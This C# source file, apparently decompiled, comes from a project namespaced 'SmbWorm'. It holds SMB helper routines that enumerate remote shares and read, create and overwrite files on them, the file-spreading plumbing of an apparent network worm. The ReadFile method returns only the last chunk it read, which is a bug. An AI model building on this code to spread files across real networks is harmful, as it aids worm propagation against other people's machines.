using System;
using System.Collections.Generic;
using System.IO;
using SMBLibrary;
using SMBLibrary.Client;

namespace SmbWorm.Smb;

internal class SmbMethods
{
	public static List<FileDirectoryInformation> GetDir(ISMBFileStore fileStore, string path)
	{
		FileStatus fileStatus = FileStatus.FILE_SUPERSEDED;
		if (fileStore.CreateFile(out var handle, out fileStatus, path, AccessMask.GENERIC_READ, SMBLibrary.FileAttributes.Directory, ShareAccess.Read | ShareAccess.Write, CreateDisposition.FILE_OPEN, CreateOptions.FILE_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			List<QueryDirectoryFileInformation> result = new List<QueryDirectoryFileInformation>();
			fileStore.QueryDirectory(out result, handle, "*", FileInformationClass.FileDirectoryInformation);
			fileStore.CloseFile(handle);
			List<FileDirectoryInformation> list = new List<FileDirectoryInformation>();
			{
				foreach (FileDirectoryInformation item in result)
				{
					if (item.FileAttributes == SMBLibrary.FileAttributes.Directory)
					{
						list.Add(item);
					}
				}
				return list;
			}
		}
		return null;
	}

	public static List<FileDirectoryInformation> GetFiles(ISMBFileStore fileStore, string path)
	{
		if (fileStore.CreateFile(out var handle, out var _, path, AccessMask.GENERIC_READ, SMBLibrary.FileAttributes.Directory, ShareAccess.Read | ShareAccess.Write, CreateDisposition.FILE_OPEN, CreateOptions.FILE_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			fileStore.QueryDirectory(out var result, handle, "*", FileInformationClass.FileDirectoryInformation);
			fileStore.CloseFile(handle);
			List<FileDirectoryInformation> list = new List<FileDirectoryInformation>();
			{
				foreach (FileDirectoryInformation item in result)
				{
					if (item.FileAttributes != SMBLibrary.FileAttributes.Directory)
					{
						list.Add(item);
					}
				}
				return list;
			}
		}
		return null;
	}

	public static List<FileDirectoryInformation> Get(ISMBFileStore fileStore, string path)
	{
		if (fileStore.CreateFile(out var handle, out var _, path, AccessMask.GENERIC_READ, SMBLibrary.FileAttributes.Directory, ShareAccess.Read | ShareAccess.Write, CreateDisposition.FILE_OPEN, CreateOptions.FILE_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			fileStore.QueryDirectory(out var result, handle, "*", FileInformationClass.FileDirectoryInformation);
			fileStore.CloseFile(handle);
			List<FileDirectoryInformation> list = new List<FileDirectoryInformation>();
			{
				foreach (FileDirectoryInformation item in result)
				{
					list.Add(item);
				}
				return list;
			}
		}
		return null;
	}

	public static byte[] ReadFile(ISMBFileStore fileStore, SMB2Client client, string filePath)
	{
		if (fileStore is SMB1FileStore)
		{
			filePath = "\\\\" + filePath;
		}
		NTStatus nTStatus;
		if (fileStore.CreateFile(out var handle, out var _, filePath, AccessMask.SYNCHRONIZE | AccessMask.GENERIC_READ, SMBLibrary.FileAttributes.Normal, ShareAccess.Read, CreateDisposition.FILE_OPEN, CreateOptions.FILE_SYNCHRONOUS_IO_ALERT | CreateOptions.FILE_NON_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			MemoryStream memoryStream = new MemoryStream();
			long num = 0L;
			byte[] data;
			while (true)
			{
				nTStatus = fileStore.ReadFile(out data, handle, num, (int)client.MaxReadSize);
				if (nTStatus != 0 && nTStatus != NTStatus.STATUS_END_OF_FILE)
				{
					throw new Exception("Failed to read from file");
				}
				if (nTStatus == NTStatus.STATUS_END_OF_FILE || data.Length == 0)
				{
					break;
				}
				num += data.Length;
				memoryStream.Write(data, 0, data.Length);
			}
			nTStatus = fileStore.CloseFile(handle);
			return data;
		}
		nTStatus = fileStore.CloseFile(handle);
		return null;
	}

	public static bool WriteFile(ISMBFileStore fileStore, SMB2Client client, byte[] localFilePath, string remoteFilePath)
	{
		MemoryStream memoryStream = new MemoryStream(localFilePath);
		if (fileStore.CreateFile(out var handle, out var _, remoteFilePath, AccessMask.SYNCHRONIZE | AccessMask.GENERIC_WRITE, SMBLibrary.FileAttributes.Normal, ShareAccess.None, CreateDisposition.FILE_CREATE, CreateOptions.FILE_SYNCHRONOUS_IO_ALERT | CreateOptions.FILE_NON_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			int num = 0;
			while (memoryStream.Position < memoryStream.Length)
			{
				byte[] array = new byte[client.MaxWriteSize];
				int num2 = memoryStream.Read(array, 0, array.Length);
				if (num2 < (int)client.MaxWriteSize)
				{
					Array.Resize(ref array, num2);
				}
				if (fileStore.WriteFile(out var _, handle, num, array) != 0)
				{
					throw new Exception("Failed to write to file");
				}
				num += num2;
			}
			fileStore.CloseFile(handle);
			return true;
		}
		return false;
	}

	public static bool ReWriteFile(ISMBFileStore fileStore, SMB2Client client, byte[] localFilePath, string remoteFilePath)
	{
		MemoryStream memoryStream = new MemoryStream(localFilePath);
		if (fileStore.CreateFile(out var handle, out var _, remoteFilePath, AccessMask.SYNCHRONIZE | AccessMask.GENERIC_WRITE, SMBLibrary.FileAttributes.Normal, ShareAccess.None, CreateDisposition.FILE_OVERWRITE, CreateOptions.FILE_SYNCHRONOUS_IO_ALERT | CreateOptions.FILE_NON_DIRECTORY_FILE, null) == NTStatus.STATUS_SUCCESS)
		{
			int num = 0;
			while (memoryStream.Position < memoryStream.Length)
			{
				byte[] array = new byte[client.MaxWriteSize];
				int num2 = memoryStream.Read(array, 0, array.Length);
				if (num2 < (int)client.MaxWriteSize)
				{
					Array.Resize(ref array, num2);
				}
				if (fileStore.WriteFile(out var _, handle, num, array) != 0)
				{
					throw new Exception("Failed to write to file");
				}
				num += num2;
			}
			fileStore.CloseFile(handle);
			return true;
		}
		return false;
	}
}
